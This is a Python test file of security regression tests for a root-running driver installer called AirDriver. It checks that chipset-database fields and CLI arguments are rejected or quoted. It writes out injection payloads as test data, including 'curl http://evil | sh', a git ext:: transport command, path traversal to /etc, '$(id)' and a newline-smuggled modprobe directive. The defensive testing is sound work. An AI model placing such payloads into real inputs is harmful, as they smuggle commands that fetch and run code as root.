"""Security regression tests.

AirDriver runs as root and executes shell commands, so the question these tests
answer is narrow and important: **can a value that AirDriver did not author end
up executing as root?**

Two sources of such values:

* the **chipset database**, which is community-contributed by pull request, and
  whose fields are interpolated into root commands — that makes the file
  executable content, not data;
* **command-line arguments**, which reach `dkms` and `usb_modeswitch`.

Defence is in two layers and both are tested here: values are rejected at the
gate by ``db --check`` (which CI runs, so a bad PR fails review), and quoted at
the point of use, so even a hand-edited database cannot break out of a command.
"""
import copy
import json
import re
import tempfile
import unittest
from pathlib import Path

from airdriver.core import manage
from airdriver.core.chipset_db import ChipsetDB, data_path
from airdriver.core.detector import Adapter
from airdriver.core.installer import build_plan, build_remove_plan, offline_source_dir
from airdriver.core.chipset_db import DriverOption
from airdriver.core.modules import blacklist_snippet
from airdriver.core.system import SystemInfo

# Metacharacters that would end one command and begin another.
BREAKOUT = re.compile(r"[;&|`$\n]|\$\(|\|\|")


def _kali(**over):
    base = dict(os="Linux", is_linux=True, distro_id="kali", distro_name="Kali",
                is_debian_based=True, arch="x86_64", kernel_release="6.6.0-amd64",
                headers_installed=True, dkms_installed=True, build_tools=True,
                secure_boot="off", is_root=True, has_internet=True)
    base.update(over)
    return SystemInfo(**base)


def _db_with(entry_over) -> ChipsetDB:
    """The real database plus one hostile entry, loaded from a temp file."""
    raw = json.loads(data_path("chipsets.json").read_text())
    base = copy.deepcopy(next(c for c in raw["chipsets"] if c["id"] == "rtl8812au"))
    base["id"] = "evil"
    base["usb_ids"] = ["dead:beef"]
    base["kernel_native"] = None
    base.update(entry_over)
    raw["chipsets"].append(base)
    p = Path(tempfile.mkdtemp()) / "evil.json"
    p.write_text(json.dumps(raw))
    return ChipsetDB.load(p)


class TheShippedDatabaseIsClean(unittest.TestCase):
    def test_real_database_passes_the_safety_rules(self):
        """The guard must not be so strict that the real data trips it."""
        self.assertEqual(ChipsetDB.load().problems(), [])


class DatabaseValuesCannotExecute(unittest.TestCase):
    """Layer 1: `airdriver db --check` rejects a hostile contribution."""

    def _rejects(self, over, needle):
        probs = [p for p in _db_with(over).problems() if p.startswith("evil:")]
        self.assertTrue(probs, f"validator accepted a hostile entry: {over}")
        self.assertTrue(any(needle in p for p in probs), probs)

    def test_apt_package_with_a_command(self):
        self._rejects({"drivers": [{"method": "apt",
                                    "package": "realtek; curl http://evil | sh",
                                    "priority": 1}]}, "unsafe apt package")

    def test_module_name_with_a_command(self):
        self._rejects({"drivers": [{"method": "dkms_git",
                                    "repo": "https://github.com/a/b",
                                    "module": "m; id > /tmp/x", "priority": 1}]},
                      "unsafe driver module")

    def test_blacklist_entry_with_a_command(self):
        self._rejects({"blacklist": ["r8188eu; touch /tmp/pwned"]},
                      "unsafe blacklist module")

    def test_git_ext_transport_is_refused(self):
        """git's ext:: transport runs an arbitrary command, so https is pinned."""
        self._rejects({"drivers": [{"method": "dkms_git",
                                    "repo": "ext::sh -c 'curl http://evil | sh'",
                                    "module": "m", "priority": 1}]}, "unsafe repo")

    def test_offline_path_traversal_is_refused(self):
        self._rejects({"drivers": [{"method": "offline", "path": "../../../../etc",
                                    "module": "m", "priority": 1}]}, "unsafe offline path")


class GeneratedShellIsQuoted(unittest.TestCase):
    """Layer 2: even with a hostile database loaded, no step breaks out."""

    def _plan_shells(self, db):
        chip = db.get("evil")
        ad = Adapter(bus="1", device="2", vid="dead", pid="beef",
                     description="x", chipset=chip)
        shells = [s.shell for s in build_plan(ad, _kali()).steps if s.shell]
        shells += [s.shell for s in build_remove_plan(chip, _kali()).steps if s.shell]
        return chip, shells

    def _assert_contained(self, shells, payload):
        """The payload may appear (quoted or in a message), but never as a
        command: it must not sit unquoted where the shell would run it."""
        for sh in shells:
            for line in sh.splitlines():
                if payload in line:
                    # The dangerous shape is the payload following a command
                    # word without quoting, e.g.  apt-get install -y x; curl …
                    self.assertNotRegex(
                        line, r"(?:apt-get install -y|modprobe|dkms remove|dpkg -l) "
                              r"[^'\"]*" + re.escape(payload.split()[0]) + r"\s*;",
                        f"unquoted payload reached a command: {line}")

    def test_apt_package_payload_is_quoted(self):
        db = _db_with({"drivers": [{"method": "apt",
                                    "package": "realtek; curl http://evil | sh",
                                    "priority": 1}]})
        _, shells = self._plan_shells(db)
        self._assert_contained(shells, "curl http://evil")
        joined = "\n".join(shells)
        # Where the package is actually used it must be inside single quotes.
        for line in joined.splitlines():
            if "apt-get install -y" in line and "curl" in line:
                self.assertIn("'", line, f"package not quoted: {line}")

    def test_blacklist_module_payload_is_quoted(self):
        db = _db_with({"blacklist": ["r8188eu; touch /tmp/pwned"]})
        _, shells = self._plan_shells(db)
        for line in "\n".join(shells).splitlines():
            if "modprobe" in line and "touch /tmp/pwned" in line:
                self.assertIn("'", line, f"module not quoted: {line}")


class BlacklistFileCannotBeSmuggled(unittest.TestCase):
    def test_newline_cannot_add_directives(self):
        """/etc/modprobe.d is parsed by the module loader — a newline in a module
        name would otherwise inject an extra directive."""
        out = blacklist_snippet(["good_mod", "evil\ninstall bad /bin/sh"])
        self.assertIn("blacklist good_mod", out)
        self.assertNotIn("install bad /bin/sh\n", out.replace("# skipped", ""))
        for line in out.splitlines():
            if line.startswith("blacklist "):
                self.assertRegex(line, r"^blacklist [A-Za-z0-9_-]+$")


class OfflineSourceIsContained(unittest.TestCase):
    def test_traversal_outside_data_is_refused(self):
        opt = DriverOption(method="offline", path="../../../../etc", module="m")
        self.assertIsNone(offline_source_dir(opt),
                          "a database entry escaped the data/ directory")

    def test_absolute_path_is_refused(self):
        self.assertIsNone(offline_source_dir(
            DriverOption(method="offline", path="/etc", module="m")))


class CommandLineArgumentsAreValidated(unittest.TestCase):
    def test_modeswitch_rejects_a_non_usb_id(self):
        with self.assertRaises(ValueError):
            manage.build_modeswitch_plan("0bda:1a2b; curl http://evil | sh")
        with self.assertRaises(ValueError):
            manage.build_modeswitch_plan("$(id)")

    def test_modeswitch_accepts_a_real_id(self):
        plan = manage.build_modeswitch_plan("0BDA:1A2B")
        self.assertTrue(any("0bda" in (s.shell or "") for s in plan.steps))

    def test_rebuild_target_is_quoted(self):
        plan = manage.build_rebuild_plan(_kali(), only="mod; curl http://evil | sh")
        for s in plan.steps:
            if s.shell and "curl http://evil" in s.shell:
                self.assertRegex(s.shell, r"dkms build -m '[^']*'",
                                 f"rebuild target not quoted: {s.shell}")


if __name__ == "__main__":
    unittest.main()
